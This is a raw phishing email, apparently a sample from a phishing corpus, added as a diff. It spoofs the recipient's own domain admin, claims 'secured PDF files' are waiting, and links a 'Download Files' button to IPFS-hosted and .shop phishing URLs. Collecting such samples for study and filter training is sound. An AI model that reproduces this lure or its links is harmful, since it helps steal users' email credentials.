@@ -1,0 +1,109 @@
+From jose@monkey.org Wed Sep 13 23:20:25 2023 +0000
+Return-Path: jose@monkey.org
+Delivered-To: jose@monkey.org
+X-FDA: 81233145210.05.9E2BF3F
+Received: from mail-mark.top (mail-mark.top [106.75.93.82])
+	by imf04.b.hostedemail.com (Postfix) with ESMTP id 2FFF5160004
+	for <jose@monkey.org>; Wed, 13 Sep 2023 23:20:23 +0000 (UTC)
+Authentication-Results: imf04.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf04.b.hostedemail.com: 106.75.93.82 is neither permitted nor denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1694647224;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=5PFU56cPhqaCj1gDJFXyRMmRq7qM4s2D3bOUlCQGV+k=;
+	b=xfFmE0Dqqn6yMTvuGObDr+1t3JQznR6JdoqqzKMfXpK5EgXH0Z5FqwI5Ejil4ofhtODxl6
+	+cThrAKFS96SEyI87BjbvXPkqaJfEWMKoYn8/ZjvsgVJldFx83xB0WvDEwgImJZQLteRwH
+	a51Xo56rDWCRONkU9lJ4Dh6mHPu5ksA=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1694647224; a=rsa-sha256;
+	cv=none;
+	b=lTke8zgg2NNgHk2Vl7ZUI2U70uvZ9wh2ENjoTy+PkBr4VYgG09BKpfCY7R3OdPychHInoU
+	fjKS1aAgedzl3IiQMmtX8cRqZT9SDRWORFY/msiOq7PKqmYYD2hFKDpn9Iqy3QNY/L4m5M
+	sZ8qLq8W3Us6y+v+9jMRB4G8pi9h7rs=
+ARC-Authentication-Results: i=1;
+	imf04.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf04.b.hostedemail.com: 106.75.93.82 is neither permitted nor denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org;
+	dmarc=none
+From: monkey.org <jose@monkey.org>
+To: jose@monkey.org
+Subject: jose@monkey.org has received secured documents Via monkey.org Admin.
+Date: 14 Sep 2023 01:20:18 +0200
+Message-ID: <20230914012018.BA3EA5CBEB84B39F@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: 2FFF5160004
+X-Stat-Signature: on8nh73ttc7w4wrc79enhe7w75tisakq
+X-Spam-Status: No, score=8.60
+X-Rspam-User: 
+X-HE-Tag: 1694647223-645360
+X-HE-Meta: U2FsdGVkX1/eMKKL4op5z5a+Kb0vha/ie12S/HlZKe3FjRpx4jbuixMDHkmr7RI+LRk1vnnYoNsJY3Q7Qc+f32mcGrYUvjnlMJxYJr485WIvJUVaM1OOmBRR27yo6IckEJqnjZS/Ze/NY64Wl3vwQPlozV0uM1QWuDyJHamec516LoPlyRvq3Rxpj0CstXtNdj0MS6oRm7MBSsZ8Ywu8+cw0annizYATDnRNt70zWOk=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 283
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY style=3D"MARGIN: 0.5em">
+<P>
+<TABLE style=3D'FONT-SIZE: 14px; FONT-FAMILY: "helvetica neue", helvetica, =
+arial, sans-serif; WIDTH: 847px; WHITE-SPACE: normal; WORD-SPACING: 0px; BO=
+RDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb=
+(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPA=
+CING: normal; LINE-HEIGHT: 21px; BACKGROUND-COLOR: rgb(255,255,255); font-v=
+ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
+dth: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial' cellSpacing=
+=3D0 cellPadding=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box; MARGIN: 0px; LINE-HEIGHT: 21px">
+<TD style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: top; PADDING-BOTTOM: 2=
+0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 21px; P=
+ADDING-RIGHT: 0px" vAlign=3Dtop>
+<DIV style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: border-box=
+" color=3D#0000ff><FONT color=3D#000000>Greetings jose</FONT>,</FONT></DIV>=
+
+<DIV style=3D"BOX-SIZING: border-box">&nbsp;</DIV>
+<DIV style=3D"BOX-SIZING: border-box">You have&nbsp;received secured PDF fi=
+les, download your files using the link below:<BR style=3D"BOX-SIZING: bord=
+er-box"></DIV></TD></TR>
+<TR style=3D"BOX-SIZING: border-box; MARGIN: 0px; LINE-HEIGHT: 21px">
+<TD style=3D"BOX-SIZING: border-box; MARGIN: 0px">&nbsp;</TD></TR>
+<TR style=3D"BOX-SIZING: border-box; MARGIN: 0px; LINE-HEIGHT: 21px">
+<TD style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: top; PADDING-BOTTOM: 2=
+0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 21px; P=
+ADDING-RIGHT: 0px" vAlign=3Dtop>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<SPAN style=3D"BOX-SIZING: border-box=
+">&nbsp;</SPAN><SPAN style=3D"BOX-SIZING: border-box"><SPAN>&nbsp;</SPAN>&n=
+bsp;</SPAN><SPAN>&nbsp;</SPAN>
+<A style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(52,142,218) 10px solid;=
+ BORDER-RIGHT: rgb(52,142,218) 20px solid; BORDER-BOTTOM: rgb(52,142,218) 1=
+0px solid; TEXT-TRANSFORM: capitalize; FONT-WEIGHT: bold; COLOR: rgb(255,25=
+5,255); TEXT-ALIGN: center; BORDER-LEFT: rgb(52,142,218) 20px solid; MARGIN=
+: 0px; DISPLAY: inline-block; LINE-HEIGHT: 21px; BACKGROUND-COLOR: rgb(52,1=
+42,218); text-decoration-line: none; border-radius: 5px"=20
+href=3D"https://ipfs.io/ipfs/bafybeifcgev4fbvg4u6fkkzl4owv6qftjpgg7drkc7exg=
+my2zp5krfy4yu/lkvbnhjgkmnbvcfdreooi.html#jose@monkey.org" rel=3Dnoreferrer =
+target=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp=
+s://mail.combiners.shop/connections.html?trans%3Dmaggie_lee@silicon-power.c=
+om&amp;source=3Dgmail&amp;ust=3D1694521615988000&amp;usg=3DAOvVaw0bQgEXVj2D=
+Na9_-g8wJa2s">Download Files</A></TD></TR>
+<TR style=3D"BOX-SIZING: border-box; MARGIN: 0px; LINE-HEIGHT: 21px">
+<TD style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: top; PADDING-BOTTOM: 2=
+0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 21px; P=
+ADDING-RIGHT: 0px" vAlign=3Dtop>This message was approved by<SPAN style=3D"=
+BOX-SIZING: border-box">&nbsp;<B>monkey.org</B></SPAN><SPAN style=3D"BOX-SI=
+ZING: border-box">&nbsp;</SPAN>Online Admin</TD></TR></TBODY></TABLE></P></=
+BODY></HTML>
